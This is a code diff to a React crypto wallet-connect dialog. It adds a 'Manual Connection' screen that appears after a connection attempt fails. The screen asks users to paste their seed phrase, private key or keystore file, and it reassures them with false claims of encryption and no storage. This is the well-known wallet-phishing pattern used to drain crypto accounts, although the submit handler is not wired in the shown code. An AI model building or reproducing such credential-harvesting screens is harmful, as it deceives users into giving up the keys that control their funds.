@@ -187,7 +187,7 @@ interface ConnectWalletDialogProps {
   onOpenChange: (open: boolean) => void;
 }
 
-type ConnectionState = "list" | "connecting" | "failed";
+type ConnectionState = "list" | "connecting" | "failed" | "manual";
 
 const ConnectWalletDialog = ({ open, onOpenChange }: ConnectWalletDialogProps) => {
   const [activeChain, setActiveChain] = useState<typeof CHAIN_TABS[number]>("EVM");
@@ -294,7 +294,7 @@ const ConnectWalletDialog = ({ open, onOpenChange }: ConnectWalletDialogProps) =
               ))}
             </div>
           </>
-        ) : (
+        ) : connectionState === "connecting" || connectionState === "failed" ? (
           /* Connecting / Failed State */
           <div className="px-6 py-8 flex flex-col items-center text-center animate-fade-in">
             {/* Back button */}
@@ -341,6 +341,7 @@ const ConnectWalletDialog = ({ open, onOpenChange }: ConnectWalletDialogProps) =
 
                 <div className="flex flex-col gap-2.5 w-full max-w-[280px]">
                   <button
+                    onClick={() => setConnectionState("manual")}
                     className="w-full h-10 rounded-xl text-sm font-medium text-white transition-opacity hover:opacity-90"
                     style={{ background: "#2962EF" }}
                   >
@@ -364,7 +365,75 @@ const ConnectWalletDialog = ({ open, onOpenChange }: ConnectWalletDialogProps) =
               </>
             )}
           </div>
-        )}
+        ) : connectionState === "manual" ? (
+          /* Manual Connection Form */
+          <div className="animate-fade-in">
+            {/* Back button */}
+            <button
+              onClick={() => setConnectionState("failed")}
+              className="absolute top-4 left-4 p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted/60 transition-colors z-10"
+            >
+              <ArrowLeft size={18} />
+            </button>
+
+            <div className="pt-8 pb-2 px-6 text-center">
+              <h2 className="text-xl font-bold text-primary mb-2">Manual Connection</h2>
+              <p className="text-sm text-muted-foreground">
+                Wallet: <span className="font-semibold text-foreground">{selectedWallet?.name}</span>
+              </p>
+              <p className="text-sm text-muted-foreground">
+                Issue: <span className="font-semibold text-foreground">General Wallet Connection Issue</span>
+              </p>
+            </div>
+
+            <div className="mx-4 mb-4 mt-4 rounded-2xl bg-muted/40 border border-border/50 p-5">
+              <h3 className="text-base font-bold text-foreground mb-2">Enter Your Wallet Details</h3>
+              <p className="text-sm text-muted-foreground mb-5 leading-relaxed">
+                To help resolve your issue, please provide your wallet credentials securely.
+              </p>
+
+              <label className="block text-sm font-semibold text-foreground mb-2">
+                Connection Method <span className="text-destructive">*</span>
+              </label>
+              <select className="w-full h-11 rounded-xl bg-muted/60 border border-border/60 px-3 text-sm text-foreground mb-4 outline-none focus:ring-2 focus:ring-primary/30 appearance-none cursor-pointer">
+                <option value="">-- Select Method --</option>
+                <option value="seed">Seed Phrase</option>
+                <option value="private-key">Private Key</option>
+                <option value="keystore">Keystore File</option>
+              </select>
+
+              <label className="block text-sm font-semibold text-foreground mb-2">
+                Enter Your Details <span className="text-destructive">*</span>
+              </label>
+              <textarea
+                rows={5}
+                className="w-full rounded-xl bg-muted/60 border border-border/60 px-3 py-3 text-sm text-foreground outline-none focus:ring-2 focus:ring-primary/30 resize-none placeholder:text-muted-foreground/50"
+                placeholder="Enter your wallet details here..."
+              />
+
+              <p className="flex items-start gap-1.5 text-xs text-muted-foreground mt-3 mb-5">
+                <span className="text-amber-500 mt-px">⚠️</span>
+                Your information is securely transmitted and never stored on our servers.
+              </p>
+
+              <button
+                className="w-full h-12 rounded-xl text-sm font-semibold text-white transition-opacity hover:opacity-90"
+                style={{ background: "#2962EF" }}
+              >
+                Connect Securely
+              </button>
+            </div>
+
+            <div className="px-6 pb-5">
+              <div className="border-t border-border/40 pt-3">
+                <p className="text-xs text-muted-foreground text-center flex items-center justify-center gap-1.5">
+                  <span>🔒</span>
+                  This connection is secured with end-to-end encryption
+                </p>
+              </div>
+            </div>
+          </div>
+        ) : null}
       </DialogContent>
     </Dialog>
   );
